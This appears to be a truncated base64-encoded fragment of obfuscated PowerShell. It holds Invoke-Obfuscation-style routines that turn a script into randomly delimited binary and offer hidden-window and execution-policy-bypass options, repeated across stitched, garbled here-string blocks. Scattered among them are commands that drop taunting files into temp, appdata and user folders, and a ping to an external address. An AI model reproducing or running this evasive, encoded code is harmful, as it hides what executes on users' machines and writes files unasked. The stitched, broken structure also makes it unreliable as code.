25UeXBlJywKICAgICAgICAgICAgJ09BdXRoVXNlcklkJywKICAgICAgICAgICAgJ1RlbmFudElkJywKICAgICAgICAgICAgJ0Vudmlyb25tZW50SWQnLAogICAgICAgICAgICAnQ29ubmVjdGVkT3JnSWQnLAogICAgICAgICAgICAnQ3JtQ29ubmVjdE9yZ1VyaUFjdHVhbCcsCiAgICAgICAgICAgICdDb25uZWN0ZWRPcmdGcmllbmRseU5hbWUnLAogICAgICAgICAgICAnQ29ubmVjdGVkT3JnVW5pcXVlTmFtZScsCiAgICAgICAgICAgICdDb25uZWN0ZWRPcmdWZXJzaW9uJywKICAgICAgICAgICAgJ1Nka1ZlcnNpb25Qcm9wZXJ0eScsCiAgICAgICAgICAgICdDYWxsZXJJZCcsCiAgICAgICAgICAgICdDYWxsZXJBQURPYmplY3RJZCcsCiAgICAgICAgICAgICdEaXNhYmxlQ3Jvc3NUaHJlYWRTYWZldGllcycsCiAgICAgICAgICAgICdTZXNzaW9uVHJhY2tpbmdJZCcsCiAgICAgICAgICAgICdGb3JjZVNlcnZlck1ldGFkYXRhQ2FjaGVDb25zaXN0ZW5jeScsIAogICAgICAgICAgICAnTGFzdENybUVycm9yJwogICAgICAgICkKICAgICAgICAkZGVmYXVsdFByb3BzU2V0Q3JtU2VydmljZUNsaWVudD1OZXctT2JqZWN0IFN5c3RlbS5NYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNQcm9wZXJ0eVNldCgnRGVmYXVsdERpc3BsYXlQcm9wZXJ0eVNldCcsW3N0cmluZ1tdXSRkZWZhdWx0UHJvcHNDcm1TZXJ2aWNlQ2xpZW50KQogICAgICAgICRQU1N0YW5kYXJkTWVtYmVycyA9IFtTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTTWVtYmVySW5mb1tdXUAoJGRlZmF1bHRQcm9wc1NldENybVNlcnZpY2VDbGllbnQpCiAgICAgICAgJGNvbm58IEFkZC1NZW1iZXIgTWVtYmVyU2V0IFBTU3RhbmRhcmRNZW1iZXJzICRQU1N0YW5kYXJkTWVtYmVycyAtRm9yY2UKICAgIH1DYXRjaHsKICAgICAgICBXcml0ZS1WZXJib3NlICJGYWlsZWQgdG8gc2V0IGEgbmV3IFBTU3RhbmRhcmRNZW1iZXIgb24gY29ubmVjdGlvbiBvYmplY3QiCiAgICB9Cn0KJEpyV0RlWFpRR2Y2ZmYgPSBAIgogICAgICAgIFtWYWxpZGF0ZVNldCgoV1VKSkV5Q2lnQ0lLV3JnbCgnTm9ybWFsJykpLCAod1VKSmVZQ0lHQ2lLV3JnTCgnTWluaW1pemVkJykpLCAod3VKakV5Q0lHQ2lLd3JnbCgnTWF4aW1pemVkJykpLCAoV3VqSkVZQ0lHY0lLV3JnbCgnSGlkZGVuJykpKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICR0eHk3d3g3M1MsCgogICAgICAgIFtWYWxpZGF0ZVNldCgod1VqSkVZQ2lHQ0lLd1JHTCgnQnlwYXNzJykpLCAod3VqSkVZY0lHQ0lLd3JHbCgnVW5yZXN0cmljdGVkJykpLCAod1VKakVZY0lHQ0lrV1JnbCgnUmVtb3RlU2lnbmVkJykpLCAod1VKSkVZQ2lHY2lLV3JnbCgnQWxsU2lnbmVkJykpLCAoV3VqakVZQ0lHQ0lrd1JnbCgnUmVzdHJpY3RlZCcpKSldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkb2l3VWFJYnh1TGNzaFksCiAgICAgICAgCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkeXN0a0VIOU1SMWV1STdPZDMKICAgICkKCiAgICAjJGVudjp0ZW1wCiAgICAjIEVuY29kaW5nIGJhc2UgdmFsdWVzOiAxNj1IZXgsIDg9T2N0YWwsIDI9QmluYXJ5CiAgICAkR01kX0pPOElDSXAgPSAyCgogICAgIyBFaXRoZXIgY29udmVydCBTY3JpcHRCbG9jayB0byBhIFN0cmluZyBvciBjb252ZXJ0IHNjcmlwdCBhdCAkUGF0aCB0byBhIFN0cmluZy4KICAgIElmKCRUYlN0Q3BCUFZbKCd7MH17MX0nLWYnUGF0JywnaCcpXSkKICAgIHsKICAgICAgICBHZXQtQ2hpbGRJdGVtICRId2w0QlVDS1k5IC1FcnJvckFjdGlvbiBTdG9wIHwgT3V0LU51bGwKICAgICAgICAkUTd4QVFOcTFZODhlID0gW0lPLkZpbGVdOjpSZWFkQWxsVGV4dCgoUmVzb2x2ZS1QYXRoICRod2w0YnVjS1k5KSkKICAgIH0gICAiQAogICAgICAgIAogICAgICAgIEAiCiAgICBFbHNlCiAgICB7CiAgICAgICAgJHE3eGFRTnExWTg4ZSA9IFtTdHJpbmddJG85RGYwU1JwdDgzRjZCaG81aQogICAgfQoKICAgICMgQ3JlYXRlIGxpc3Qgb2YgcmFuZG9tIGRlbGltaXRlcnMgJFJhbmRvbURlbGltaXRlcnMuCiAgICAjIEF2b2lkIHVzaW5nIC4gKiAnICIgWyBdICggKSBldGMuIGFzIGRlbGltaXRlcnMgYXMgdGhlc2Ugd2lsbCBjYXVzZSBwcm9ibGVtcyBpbiB0aGUgLVNwbGl0IGNvbW1hbmQgc3ludGF4LgogICAgJGFWVlM4WTEya3RtV19kNSAgPSBAKChXdWpKRXlDSUdDSUt3ckdMKCdfJykpLCh3VUpKRVljSUdDSWtXUkdsKCctJykpLCh3dWpKZXljSUdDSUtXcmdMKCcsJykpLChXdWpKRVlDSUdDSUt3UmdMKCd7JykpLCh3VWpKZXlDSWdjSWtXUmdMKCd9JykpLCh3VUpKZXlDSUdDSUtXUmdMKCd+JykpLChXVWpKRVljSUdjaUtXckdMKCchJykpLChXVUpKRVlDaWdDSWt3ckdMKCdAJykpLCh3VWpKZVlDSWdDSWt3cmdMKCclJykpLChXVWpqZXlDSWdjaWtXckdsKCcmJykpLCh3dUpKRVlDSUdDSUt3cmdMKCc8JykpLCh3VWpKRVljSUdDSWtXcmdMKCc+JykpLCh3dUpqRVlDSUdDSUtXUmdsKCc7JykpLCh3dUpKRVljSUdjaUtXcmdsKCc6JykpKQoKICAgICMgQWRkIGxldHRlcnMgYS16IHdpdGggcmFuZG9tIGNhc2UgdG8gJFJhbmRvbURlbGltaXRlcnMuCiAgICBAKChXVUpKRVlDSWdDaUtXcmdsKCdhJykpLCh3dUpKRVljSUdDSWtXckdsKCdiJykpLChXdWpqRXljSWdDaUtXckdMKCdjJykpLCh3dWpKRVlDSWdjaWt3cmdMKCdkJykpLChXdUpqRXlDSUdDSUt3cmdsKCdlJykpLCh3VUpKZVljaWdDSWtXcmdsKCdmJykpLChXdUpKRXljSUdDSUtXUmdMKCdnJykpLCh3dWpqZXljaUdjaWtXcmdMKCdoJykpLCh3dUpKZVlDaUdDSUtXcmdsKCdpJykpLCh3VWpKRVlDaWdjSUt3UmdsKCdqJykpLCh3VWpqRVlDSWdDSUtXUkdMKCdrJykpLCh3VUpKRVlDaUdDSWtXckdMKCdsJykpLChXdUpqZVljSUdjSUtXcmdsKCdtJykpLCh3VWpqZVlDaUdDaUtXUkdMKCduJykpLChXdUpqRVljSWdDSWt3ckdsKCdvJykpLCh3dUpKRXljSUdDaUt3cmdsKCdwJykpLChXdWpKZVlDSUdjSWt3ckdMKCdxJykpLCh3VUpKRXlDSWdDSWtXUkdsKCdyJykpLCh3dUpKZVljSUdDSUtXcmdMKCdzJykpLCh3dWpqRVlDSUdjaWtXUmdMKCd0JykpLChXVWpqRXlDaWdDSWtXckdMKCd1JykpLCh3dWpKZXljSUdjSUtXckdsKCd2JykpLCh3dWpKZVlDSUdDSUt3cmdMKCd3JykpLChXdUpKZVljSWdDSWtXcmdMKCd4JykpLCh3VWpKZXlDaWdDaUtXcmdsKCd5JykpLChXVUpKRVljaUdjaWtXcmdsKCd6JykpKSB8IEZvckVhY2gtT2JqZWN0IHskUU9oN2tWMTFGUmVTNl8ybmkgPSAkXzsgSWYoKChHZXQtUmFuZG9tIC1JbnB1dCBAKCgyIC0gMSkuLigyICsgKDEgLSAxKSkpKS0oMyAtIDIpIC1lcSAwKSkgeyRRT0g3S1YxMUZSZVM2XzJuSSA9ICRxT2g3a1YxMUZyZVM2XzJOaS5Ub1VwcGVyKCl9ICRBVnZTOHkxMkt0TXdfZDUgKz0gJFFPSDdLdjExZlJlUzZfMk5JfQogICAgICAgICJACiAgICAgICAgCiAgICAgICAgQCIKICAgICMgT25seSB1c2UgYSBzdWJzZXQgb2YgY3VycmVudCBkZWxpbWl0ZXJzIHRvIHJhbmRvbWl6ZSB3aGF0IHlvdSBzZWUgaW4gZXZlcnkgaXRlcmF0aW9uIG9mIHRoaXMgc2NyaXB0J3Mgb3V0cHV0LgogICAgJEFWVnM4eTEyS1Rtd19kNSA9IChHZXQtUmFuZG9tIC1JbnB1dCAkQXZ2Uzh5MTJrVE1XX2Q1IC1Db3VudCAoJEF2dlM4WTEya3RtV19kNS5Db3VudC8oMiArIDIpKSkKCiAgICAjIENvbnZlcnQgJFNjcmlwdFN0cmluZyB0byBkZWxpbWl0ZWQgQmluYXJ5IHZhbHVlcyBpbiBbQ2hhcl0gYXJyYXkgc2VwYXJhdGVkIGJ5IHJhbmRvbSBkZWxpbWl0ZXIgZnJvbSBkZWZpbmVkIGxpc3QgJFJhbmRvbURlbGltaXRlcnMuCiAgICAkeE5USjJ3ODFWSiA9ICh3dWpKRVlDSUdDaWtXcmdsKCcnKSkKICAgIChbQ2hhcltdXSRRN1hBUW5xMVk4OGUpIHwgRm9yRWFjaC1PYmplY3QgeyRYbnRqMnc4MVZqICs9IChbQ29udmVydF06OlRvU3RyaW5nKChbSW50XVtDaGFyXSRfKSwkZ21EX0pPOElDaXApICsgKEdldC1SYW5kb20gLUlucHV0ICRBdnZzOHkxMmt0bVdfZDUpKX0KIkAKICAgIGVjaG8gJ2JsdW5kZXIgOignID4gJGVudjp0ZW1wL0dldC1SYW5kb20KICAgIGVjaG8gJ2JsdW5kZXIgYWdhaW4gIDooJyA+ICRlbnY6YXBwZGF0YS9HZXQtUmFuZG9tCiQzNENkRWdQZ3hjY1pnVUhFNVVTMkZ3N2dBNXF5eE03eFlHTUpFUnBtSHh0UEpBTTNWaCA9IApAIgogICAgICAgIFtWYWxpZGF0ZVNldCgoV1VKSkV5Q2lnQ0lLV3JnbCgnTm9ybWFsJykpLCAod1VKSmVZQ0lHQ2lLV3JnTCgnTWluaW1pemVkJykpLCAod3VKakV5Q0lHQ2lLd3JnbCgnTWF4aW1pemVkJykpLCAoV3VqSkVZQ0lHY0lLV3JnbCgnSGlkZGVuJykpKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICR0eHk3d3g3M1MsCgogICAgICAgIFtWYWxpZGF0ZVNldCgod1VqSkVZQ2lHQ0lLd1JHTCgnQnlwYXNzJykpLCAod3VqSkVZY0lHQ0lLd3JHbCgnVW5yZXN0cmljdGVkJykpLCAod1VKakVZY0lHQ0lrV1JnbCgnUmVtb3RlU2lnbmVkJykpLCAod1VKSkVZQ2lHY2lLV3JnbCgnQWxsU2lnbmVkJykpLCAoV3VqakVZQ0lHQ0lrd1JnbCgnUmVzdHJpY3RlZCcpKSldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkb2l3VWFJYnh1TGNzaFksCiAgICAgICAgCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkeXN0a0VIOU1SMWV1STdPZDMKICAgICkKICAgICJACiAgICAgICAgCiAgICAgICAgQCIKICAgICMgRW5jb2RpbmcgYmFzZSB2YWx1ZXM6IDE2PUhleCwgOD1PY3RhbCwgMj1CaW5hcnkKICAgICRHTWRfSk84SUNJcCA9IDIKCiAgICAjIEVpdGhlciBjb252ZXJ0IFNjcmlwdEJsb2NrIHRvIGEgU3RyaW5nIG9yIGNvbnZlcnQgc2NyaXB0IGF0ICRQYXRoIHRvIGEgU3RyaW5nLgogICAgSWYoJFRiU3RDcEJQVlsoJ3swfXsxfSctZidQYXQnLCdoJyldKQogICAgewogICAgICAgIEdldC1DaGlsZEl0ZW0gJEh3bDRCVUNLWTkgLUVycm9yQWN0aW9uIFN0b3AgfCBPdXQtTnVsbAogICAgICAgICRRN3hBUU5xMVk4OGUgPSBbSU8uRmlsZV06OlJlYWRBbGxUZXh0KChSZXNvbHZlLVBhdGggJGh3bDRidWNLWTkpKQogICAgfQogICAgRWxzZQogICAgewogICAgICAgICRxN3hhUU5xMVk4OGUgPSBbU3RyaW5nXSRvOURmMFNScHQ4M0Y2QmhvNWkKICAgIH0KICAgICJACiAgICAgICAgCiAgICAgICAgQCIKICAgICMgQ3JlYXRlIGxpc3Qgb2YgcmFuZG9tIGRlbGltaXRlcnMgJFJhbmRvbURlbGltaXRlcnMuCiAgICAjIEF2b2lkIHVzaW5nIC4gKiAnICIgWyBdICggKSBldGMuIGFzIGRlbGltaXRlcnMgYXMgdGhlc2Ugd2lsbCBjYXVzZSBwcm9ibGVtcyBpbiB0aGUgLVNwbGl0IGNvbW1hbmQgc3ludGF4LgogICAgICAgICRhVlZTOFkxMmt0bVdfZDUgID0gQCgoV3VqSkV5Q0lHQ0lLd3JHTCgnXycpKSwod1VKSkVZY0lHQ0lrV1JHbCgnLScpKSwod3VqSmV5Y0lHQ0lLV3JnTCgnLCcpKSwoV3VqSkVZQ0lHQ0lLd1JnTCgneycpKSwod1VqSmV5Q0lnY0lrV1JnTCgnfScpKSwod1VKSmV5Q0lHQ0lLV1JnTCgnficpKSwoV1VqSkVZY0lHY2lLV3JHTCgnIScpKSwoV1VKSkVZQ2lnQ0lrd3JHTCgnQCcpKSwod1VqSmVZQ0lnQ0lrd3JnTCgnJScpKSwoV1VqamV5Q0lnY2lrV3JHbCgnJicpKSwod3VKSkVZQ0lHQ0lLd3JnTCgnPCcpKSwod1VqSkVZY0lHQ0lrV3JnTCgnPicpKSwod3VKakVZQ0lHQ0lLV1JnbCgnOycpKSwod3VKSkVZY0lHY2lLV3JnbCgnOicpKSkKICAgICJACiAgICAgICAgICAgIAogICAgICAgICAgICBAIgogICAgICAgICMgQWRkIGxldHRlcnMgYS16IHdpdGggcmFuZG9tIGNhc2UgdG8gJFJhbmRvbURlbGltaXRlcnMuCiAgICAgICAgQCgoV1VKSkVZQ0lnQ2lLV3JnbCgnYScpKSwod3VKSkVZY0lHQ0lrV3JHbCgnYicpKSwoV3VqakV5Y0lnQ2lLV3JHTCgnYycpKSwod3VqSkVZQ0lnY2lrd3JnTCgnZCcpKSwoV3VKakV5Q0lHQ0lLd3JnbCgnZScpKSwod1VKSmVZY2lnQ0lrV3JnbCgnZicpKSwoV3VKSkV5Y0lHQ0lLV1JnTCgnZycpKSwod3VqamV5Y2lHY2lrV3JnTCgnaCcpKSwod3VKSmVZQ2lHQ0lLV3JnbCgnaScpKSwod1VqSkVZQ2lnY0lLd1JnbCgnaicpKSwod1VqakVZQ0lnQ0lLV1JHTCgnaycpKSwod1VKSkVZQ2lHQ0lrV3JHTCgnbCcpKSwoV3VKamVZY0lHY0lLV3JnbCgnbScpKSwod1VqamVZQ2lHQ2lLV1JHTCgnbicpKSwoV3VKakVZY0lnQ0lrd3JHbCgnbycpKSwod3VKSkV5Y0lHQ2lLd3JnbCgncCcpKSwoV3VqSmVZQ0lHY0lrd3JHTCgncScpKSwod1VKSkV5Q0lnQ0lrV1JHbCgncicpKSwod3VKSmVZY0lHQ0lLV3JnTCgncycpKSwod3VqakVZQ0lHY2lrV1JnTCgndCcpKSwoV1VqakV5Q2lnQ0lrV3JHTCgndScpKSwod3VqSmV5Y0lHY0lLV3JHbCgndicpKSwod3VqSmVZQ0lHQ0lLd3JnTCgndycpKSwoV3VKSmVZY0lnQ0lrV3JnTCgneCcpKSwod1VqSmV5Q2lnQ2lLV3JnbCgneScpKSwoV1VKSkVZY2lHY2lrV3JnbCgneicpKSkgfCBGb3JFYWNoLU9iamVjdCB7JFFPaDdrVjExRlJlUzZfMm5pID0gJF87IElmKCgoR2V0LVJhbmRvbSAtSW5wdXQgQCgoMiAtIDEpLi4oMiArICgxIC0gMSkpKSktKDMgLSAyKSAtZXEgMCkpIHskUU9IN0tWMTFGUmVTNl8ybkkgPSAkcU9oN2tWMTFGcmVTNl8yTmkuVG9VcHBlcigpfSAkQVZ2Uzh5MTJLdE13X2Q1ICs9ICRRT0g3S3YxMWZSZVM2XzJOSX0KICAgICAgICAKICAgICAgICAjIE9ubHkgdXNlIGEgc3Vic2V0IG9mIGN1cnJlbnQgZGVsaW1pdGVycyB0byByYW5kb21pemUgd2hhdCB5b3Ugc2VlIGluIGV2ZXJ5IGl0ZXJhdGlvbiBvZiB0aGlzIHNjcmlwdCdzIG91dHB1dC4KICAgICAgICAkQVZWczh5MTJLVG13X2Q1ID0gKEdldC1SYW5kb20gLUlucHV0ICRBdnZTOHkxMmtUTVdfZDUgLUNvdW50ICgkQXZ2UzhZMTJrdG1XX2Q1LkNvdW50LygyICsgMikpKQogICAgICAgICJACiAgICAgICAgICAgIAogICAgICAgICAgICBAIgogICAgICAgICMgQ29udmVydCAkU2NyaXB0U3RyaW5nIHRvIGRlbGltaXRlZCBCaW5hcnkgdmFsdWVzIGluIFtDaGFyXSBhcnJheSBzZXBhcmF0ZWQgYnkgcmFuZG9tIGRlbGltaXRlciBmcm9tIGRlZmluZWQgbGlzdCAkUmFuZG9tRGVsaW1pdGVycy4KICAgICAgICAkeE5USjJ3ODFWSiA9ICh3dWpKRVlDSUdDaWtXcmdsKCcnKSkKICAgICAgICAoW0NoYXJbXV0kUTdYQVFucTFZODhlKSB8IEZvckVhY2gtT2JqZWN0IHskWG50ajJ3ODFWaiArPSAoW0NvbnZlcnRdOjpUb1N0cmluZygoW0ludF1bQ2hhcl0kXyksJGdtRF9KTzhJQ2lwKSArIChHZXQtUmFuZG9tIC1JbnB1dCAkQXZ2czh5MTJrdG1XX2Q1KSl9CiAgICAiQAogICAgZWNobyAiY2xvc2VyIDopIiA+ICVVU0VSUFJPRklMRSVcZG9jdW1lbnRzXE4yNlY0RFU1Z3VnTmgzaFhcbm90aGluZy50bXAKICAgIGVjaG8gImNsb3NlciA6KSIgPiAlVVNFUlBST0ZJTEUlXGRvd25sb2Fkc1xTZGdOaDNoWFxzeXN0ZW1fY2FjaGUudG1wCiAgICBlY2hvICJjbG9zZXIgOikiID4gJVVTRVJQUk9GSUxFJVxQaWN0dXJlXE4yNlY0RFU1Z3VnTmgzaFhcc3lzdGVtX2NhY2hlLnRtcAoKCgoKJGhNSE50NGFGZnh6WTN3NWhnZTJha0gyQXhLV1ZaS1VYTjI2VjREVTVndWdOaDNoWHhSM3VZZHZNVDNjV1hlWSA9IEAiCiAgICAgICAgW1ZhbGlkYXRlU2V0KChXVUpKRXlDaWdDSUtXcmdsKCdOb3JtYWwnKSksICh3VUpKZVlDSUdDaUtXcmdMKCdNaW5pbWl6ZWQnKSksICh3dUpqRXlDSUdDaUt3cmdsKCdNYXhpbWl6ZWQnKSksIChXdWpKRVlDSUdjSUtXcmdsKCdIaWRkZW4nKSkpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJHR4eTd3eDczUywKICAgICAgICAiQAogICAgICAgIAogICAgICAgIEAiCiAgICAgICAgW1ZhbGlkYXRlU2V0KCh3VWpKRVlDaUdDSUt3UkdMKCdCeXBhc3MnKSksICh3dWpKRVljSUdDSUt3ckdsKCdVbnJlc3RyaWN0ZWQnKSksICh3VUpqRVljSUdDSWtXUmdsKCdSZW1vdGVTaWduZWQnKSksICh3VUpKRVlDaUdjaUtXcmdsKCdBbGxTaWduZWQnKSksIChXdWpqRVlDSUdDSWt3UmdsKCdSZXN0cmljdGVkJykpKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRvaXdVYUlieHVMY3NoWSwKICAgICAgICAKICAgICAgICBbU3dpdGNoXQogICAgICAgICR5c3RrRUg5TVIxZXVJN09kMwogICAgKQoKICAgICMgRW5jb2RpbmcgYmFzZSB2YWx1ZXM6IDE2PUhleCwgOD1PY3RhbCwgMj1CaW5hcnkKICAgICRHTWRfSk84SUNJcCA9IDIKCiAgICAjIEVpdGhlciBjb252ZXJ0IFNjcmlwdEJsb2NrIHRvIGEgU3RyaW5nIG9yIGNvbnZlcnQgc2NyaXB0IGF0ICRQYXRoIHRvIGEgU3RyaW5nLgogICAgSWYoJFRiU3RDcEJQVlsoJ3swfXsxfSctZidQYXQnLCdoJyldKQogICAgewogICAgICAgIEdldC1DaGlsZEl0ZW0gJEh3bDRCVUNLWTkgLUVycm9yQWN0aW9uIFN0b3AgfCBPdXQtTnVsbAogICAgICAgICRRN3hBUU5xMVk4OGUgPSBbSU8uRmlsZV06OlJlYWRBbGxUZXh0KChSZXNvbHZlLVBhdGggJGh3bDRidWNLWTkpKQogICAgfQogICAgIkBAIgogICAgRWxzZQogICAgewogICAgICAgICRxN3hhUU5xMVk4OGUgPSBbU3RyaW5nXSRvOURmMFNScHQ4M0Y2QmhvNWkKICAgIH0KCiAgICAjIENyZWF0ZSBsaXN0IG9mIHJhbmRvbSBkZWxpbWl0ZXJzICRSYW5kb21EZWxpbWl0ZXJzLgogICAgIyBBdm9pZCB1c2luZyAuICogJyAiIFsgXSAoICkgZXRjLiBhcyBkZWxpbWl0ZXJzIGFzIHRoZXNlIHdpbGwgY2F1c2UgcHJvYmxlbXMgaW4gdGhlIC1TcGxpdCBjb21tYW5kIHN5bnRheC4KICAgICRhVlZTOFkxMmt0bVdfZDUgID0gQCgoV3VqSkV5Q0lHQ0lLd3JHTCgnXycpKSwod1VKSkVZY0lHQ0lrV1JHbCgnLScpKSwod3VqSmV5Y0lHQ0lLV3JnTCgnLCcpKSwoV3VqSkVZQ0lHQ0lLd1JnTCgneycpKSwod1VqSmV5Q0lnY0lrV1JnTCgnfScpKSwod1VKSmV5Q0lHQ0lLV1JnTCgnficpKSwoV1VqSkVZY0lHY2lLV3JHTCgnIScpKSwoV1VKSkVZQ2lnQ0lrd3JHTCgnQCcpKSwod1VqSmVZQ0lnQ0lrd3JnTCgnJScpKSwoV1VqamV5Q0lnY2lrV3JHbCgnJicpKSwod3VKSkVZQ0lHQ0lLd3JnTCgnPCcpKSwod1VqSkVZY0lHQ0lrV3JnTCgnPicpKSwod3VKakVZQ0lHQ0lLV1JnbCgnOycpKSwod3VKSkVZY0lHY2lLV3JnbCgnOicpKSkKCiAgICAjIEFkZCBsZXR0ZXJzIGEteiB3aXRoIHJhbmRvbSBjYXNlIHRvICRSYW5kb21EZWxpbWl0ZXJzLgogICAgQCgoV1VKSkVZQ0lnQ2lLV3JnbCgnYScpKSwod3VKSkVZY0lHQ0lrV3JHbCgnYicpKSwoV3VqakV5Y0lnQ2lLV3JHTCgnYycpKSwod3VqSkVZQ0lnY2lrd3JnTCgnZCcpKSwoV3VKakV5Q0lHQ0lLd3JnbCgnZScpKSwod1VKSmVZY2lnQ0lrV3JnbCgnZicpKSwoV3VKSkV5Y0lHQ0lLV1JnTCgnZycpKSwod3VqamV5Y2lHY2lrV3JnTCgnaCcpKSwod3VKSmVZQ2lHQ0lLV3JnbCgnaScpKSwod1VqSkVZQ2lnY0lLd1JnbCgnaicpKSwod1VqakVZQ0lnQ0lLV1JHTCgnaycpKSwod1VKSkVZQ2lHQ0lrV3JHTCgnbCcpKSwoV3VKamVZY0lHY0lLV3JnbCgnbScpKSwod1VqamVZQ2lHQ2lLV1JHTCgnbicpKSwoV3VKakVZY0lnQ0lrd3JHbCgnbycpKSwod3VKSkV5Y0lHQ2lLd3JnbCgncCcpKSwoV3VqSmVZQ0lHY0lrd3JHTCgncScpKSwod1VKSkV5Q0lnQ0lrV1JHbCgncicpKSwod3VKSmVZY0lHQ0lLV3JnTCgncycpKSwod3VqakVZQ0lHY2lrV1JnTCgndCcpKSwoV1VqakV5Q2lnQ0lrV3JHTCgndScpKSwod3VqSmV5Y0lHY0lLV3JHbCgndicpKSwod3VqSmVZQ0lHQ0lLd3JnTCgndycpKSwoV3VKSmVZY0lnQ0lrV3JnTCgneCcpKSwod1VqSmV5Q2lnQ2lLV3JnbCgneScpKSwoV1VKSkVZY2lHY2lrV3JnbCgneicpKSkgfCBGb3JFYWNoLU9iamVjdCB7JFFPaDdrVjExRlJlUzZfMm5pID0gJF87IElmKCgoR2V0LVJhbmRvbSAtSW5wdXQgQCgoMiAtIDEpLi4oMiArICgxIC0gMSkpKSktKDMgLSAyKSAtZXEgMCkpIHskUU9IN0tWMTFGUmVTNl8ybkkgPSAkcU9oN2tWMTFGcmVTNl8yTmkuVG9VcHBlcigpfSAkQVZ2Uzh5MTJLdE13X2Q1ICs9ICRRT0g3S3YxMWZSZVM2XzJOSX0KICAgICJAQCIKICAgICMgT25seSB1c2UgYSBzdWJzZXQgb2YgY3VycmVudCBkZWxpbWl0ZXJzIHRvIHJhbmRvbWl6ZSB3aGF0IHlvdSBzZWUgaW4gZXZlcnkgaXRlcmF0aW9uIG9mIHRoaXMgc2NyaXB0J3Mgb3V0cHV0LgogICAgJEFWVnM4eTEyS1Rtd19kNSA9IChHZXQtUmFuZG9tIC1JbnB1dCAkQXZ2Uzh5MTJrVE1XX2Q1IC1Db3VudCAoJEF2dlM4WTEya3RtV19kNS5Db3VudC8oMiArIDIpKSkKCiAgICAjIENvbnZlcnQgJFNjcmlwdFN0cmluZyB0byBkZWxpbWl0ZWQgQmluYXJ5IHZhbHVlcyBpbiBbQ2hhcl0gYXJyYXkgc2VwYXJhdGVkIGJ5IHJhbmRvbSBkZWxpbWl0ZXIgZnJvbSBkZWZpbmVkIGxpc3QgJFJhbmRvbURlbGltaXRlcnMuCiAgICAkeE5USjJ3ODFWSiA9ICh3dWpKRVlDSUdDaWtXcmdsKCcnKSkKICAgIChbQ2hhcltdXSRRN1hBUW5xMVk4OGUpIHwgRm9yRWFjaC1PYmplY3QgeyRYbnRqMnc4MVZqICs9IChbQ29udmVydF06OlRvU3RyaW5nKChbSW50XVtDaGFyXSRfKSwkZ21EX0pPOElDaXApICsgKEdldC1SYW5kb20gLUlucHV0ICRBdnZzOHkxMmt0bVdfZDUpKX0KIkAKICAgIFBpbmcgNDIuMDY5LjI0NS4xMSAtbiAxCiRkWG5ZM2dNUnBjalE0dURCa1FIRlVBeVJwRnhEam5TcFpBVEZNZ1g5a3d4NUpOakNHNCA9IEAiCiAgICAgICAgW1ZhbGlkYXRlU2V0KChXVUpKRXlDaWdDSUtXcmdsKCdOb3JtYWwnKSksICh3VUpKZVlDSUdDaUtXcmdMKCdNaW5pbWl6ZWQnKSksICh3dUpqRXlDSUdDaUt3cmdsKCdNYXhpbWl6ZWQnKSksIChXdWpKRVlDSUdjSUtXcmdsKCdIaWRkZW4nKSkpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJHR4eTd3eDczUywKCiAgICAgICAgW1ZhbGlkYXRlU2V0KCh3VWpKRVlDaUdDSUt3UkdMKCdCeXBhc3MnKSksICh3dWpKRVljSUdDSUt3ckdsKCdVbnJlc3RyaWN0ZWQnKSksICh3VUpqRVljSUdDSWtXUmdsKCdSZW1vdGVTaWduZWQnKSksICh3VUpKRVlDaUdjaUtXcmdsKCdBbGxTaWduZWQnKSksIChXdWpqRVlDSUdDSWt3UmdsKCdSZXN0cmljdGVkJykpKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRvaXdVYUlieHVMY3NoWSwKICAgICAgICAKICAgICAgICBbU3dpdGNoXQogICAgICAgICR5c3RrRUg5TVIxZXVJN09kMwogICAgKQogICAgIkBAIgogICAgIyBFbmNvZGluZyBiYXNlIHZhbHVlczogMTY9SGV4LCA4PU9jdGFsLCAyPUJpbmFyeQogICAgJEdNZF9KTzhJQ0lwID0gMgoKICAgICMgRWl0aGVyIGNvbnZlcnQgU2NyaXB0QmxvY2sgdG8gYSBTdHJpbmcgb3IgY29udmVydCBzY3JpcHQgYXQgJFBhdGggdG8gYSBTdHJpbmcuCiAgICBJZigkVGJTdENwQlBWWygnezB9ezF9Jy1mJ1BhdCcsJ2gnKV0pCiAgICB7CiAgICAgICAgR2V0LUNoaWxkSXRlbSAkSHdsNEJVQ0tZOSAtRXJyb3JBY3Rpb24gU3RvcCB8IE91dC1OdWxsCiAgICAgICAgJFE3eEFRTnExWTg4ZSA9IFtJTy5GaWxlXTo6UmVhZEFsbFRleHQoKFJlc29sdmUtUGF0aCAkaHdsNGJ1Y0tZOSkpCiAgICB9CiAgICBFbHNlCiAgICB7CiAgICAgICAgJHE3eGFRTnExWTg4ZSA9IFtTdHJpbmddJG85RGYwU1JwdDgzRjZCaG81aQogICAgfQoKICAgICMgQ3JlYXRlIGxpc3Qgb2YgcmFuZG9tIGRlbGltaXRlcnMgJFJhbmRvbURlbGltaXRlcnMuCiAgICAjIEF2b2lkIHVzaW5nIC4gKiAnICIgWyBdICggKSBldGMuIGFzIGRlbGltaXRlcnMgYXMgdGhlc2Ugd2lsbCBjYXVzZSBwcm9ibGVtcyBpbiB0aGUgLVNwbGl0IGNvbW1hbmQgc3ludGF4LgogICAgJGFWVlM4WTEya3RtV19kNSAgPSBAKChXdWpKRXlDSUdDSUt3ckdMKCdfJykpLCh3VUpKRVljSUdDSWtXUkdsKCctJykpLCh3dWpKZXljSUdDSUtXcmdMKCcsJykpLChXdWpKRVlDSUdDSUt3UmdMKCd7JykpLCh3VWpKZXlDSWdjSWtXUmdMKCd9JykpLCh3VUpKZXlDSUdDSUtXUmdMKCd+JykpLChXVWpKRVljSUdjaUtXckdMKCchJykpLChXVUpKRVlDaWdDSWt3ckdMKCdAJykpLCh3VWpKZVlDSWdDSWt3cmdMKCclJykpLChXVWpqZXlDSWdjaWtXckdsKCcmJykpLCh3dUpKRVlDSUdDSUt3cmdMKCc8JykpLCh3VWpKRVljSUdDSWtXcmdMKCc+JykpLCh3dUpqRVlDSUdDSUtXUmdsKCc7JykpLCh3